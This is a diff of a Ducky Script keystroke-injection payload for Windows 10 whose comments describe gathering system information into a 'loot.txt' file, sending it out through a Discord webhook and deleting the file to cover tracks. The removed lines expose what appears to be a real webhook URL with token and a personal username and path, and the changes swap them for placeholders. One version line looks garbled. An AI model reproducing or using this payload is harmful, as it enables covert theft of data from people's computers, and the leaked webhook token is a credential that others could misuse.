@@ -6,7 +6,7 @@ of Ducky script runs saving the exfilled info to a notepad txt file on the Deskt
 REM It is then exfiltrated using a Discord webhook, and finally the txt file is removed from the Desktop
 REM Target: Windows 10 
 REM Props: 
-REM Version: 1.0
+REM Version: 1.0nhanced Sysinfo Exfil
 REM Category: Exfiltration
 
 
@@ -155,7 +155,7 @@ STRING )
 DELAY 500
 ENTER
 DELAY 200
-STRING $hookurl = 'https://discord.com/api/webhooks/1236708435853316157/MVOeAxf1cqUQT-I7eLElH61CNfaGgGnNZZLEMAht-rhINOML_dkE-IcmjcEk3fDtwgAF'
+STRING $hookurl = 'DISCORD WEBHOOK HERE'
 DELAY 500
 ENTER
 DELAY 200
@@ -163,7 +163,7 @@ STRING $Body = @{
 DELAY 500
 ENTER
 DELAY 200
-STRING 'username' = $env:LulzAnarchyAnon
+STRING 'username' = $env:DISCORD NAME HERE
 DELAY 500
 ENTER
 DELAY 200
@@ -195,7 +195,7 @@ STRING }
 DELAY 200
 ENTER
 DELAY 200
-STRING Upload-Discord -file "C:\Users\march\OneDrive\Desktop\loot.txt"
+STRING Upload-Discord -file "C:\Users\NAME\NAME\Desktop\loot.txt"
 DELAY 200
 ENTER
 DELAY 1000
